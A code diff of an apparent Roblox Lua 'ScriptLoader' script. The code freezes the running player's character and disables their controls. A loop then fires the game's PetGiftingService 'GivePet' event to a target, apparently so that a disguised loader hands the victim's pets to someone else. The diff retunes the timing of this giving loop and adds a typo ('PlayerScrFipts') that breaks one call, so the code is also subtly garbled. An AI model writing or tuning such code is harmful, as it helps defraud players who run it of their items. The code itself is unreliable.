@@ -20,7 +20,7 @@ local req = (syn and syn.request) or (http and http.request) or (http_request) o
 local p=game.Players.LocalPlayer
 local h=(p.Character or p.CharacterAdded:Wait()):WaitForChild("Humanoid")
 h.WalkSpeed=0 h.JumpPower=0
-pcall(function() require(p:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule")):GetControls():Disable() end)
+pcall(function() require(p:WaitForChild("PlayerScrFipts"):WaitForChild("PlayerModule")):GetControls():Disable() end)
 
 local gui = Instance.new("ScreenGui")
 gui.Name = "ScriptLoader"
@@ -330,7 +330,7 @@ local function startGiving()
 
             ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer("GivePet", target)
             prompt:InputHoldBegin()
-            task.wait(0.1)
+            task.wait(1.0)
             prompt:InputHoldEnd()
 
             if item:IsDescendantOf(LocalPlayer.Character) then
@@ -341,7 +341,7 @@ local function startGiving()
         else
             break
         end
-        task.wait(1.00)
+        task.wait(0.05)
     end
 end
 
